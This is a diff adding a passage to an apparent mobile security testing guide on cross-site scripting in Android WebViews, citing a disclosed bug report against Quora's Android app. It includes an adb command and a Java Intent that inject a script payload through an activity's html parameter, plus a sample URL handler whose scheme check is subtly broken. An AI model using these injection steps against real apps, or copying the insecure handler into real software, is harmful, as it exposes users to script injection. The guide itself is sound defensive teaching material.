@@ -163,6 +163,31 @@ In the context of *native apps*, XSS risks are far less prevalent for the simple
 
 An older but well-known example is the [local XSS issue in the Skype app for iOS, first identified by Phil Purviance]( https://superevr.com/blog/2011/xss-in-skype-for-ios). The Skype app failed to properly encode the name of the message sender, allowing an attacker to inject malicious JavaScript to be executed when a user views the message. In his proof-of-concept, Phil showed how to exploit the issue and steal a user's address book.
 
+Another example is using overriden methods that trust html parameter data. 
+
+```java
+@Override
+public boolean shouldOverrideUrlLoading(WebView view, String url) {
+  if (url.substring(0,6).equalsIgnoreCase("yourscheme:")) {
+    // parse the URL object and execute functions
+  }
+}
+```
+
+Sergey Bobrov was able to take advantage of this in the following [HackerOne report](https://hackerone.com/reports/189793). Any input to the html parameter would be trusted in Quora's ActionBarContentActivity. Payloads were successful using adb, clipboarddata via ModalContentActivity, and Intents from 3rd party applications.
+
+```bash
+adb shell
+am start -n com.quora.android/com.quora.android.ActionBarContentActivity -e url 'http://test/test' -e html 'XSS<script>alert(123)</script>'
+```
+```java
+Intent i = new Intent();
+i.setComponent(new ComponentName("com.quora.android","com.quora.android.ActionBarContentActivity"));
+i.putExtra("url","http://test/test");
+i.putExtra("html","XSS PoC <script>alert(123)</script>");
+startActivity(i);
+```
+
 #### Static Analysis
 
 Take a close look at any WebViews present and investigate for untrusted input rendered by the app.
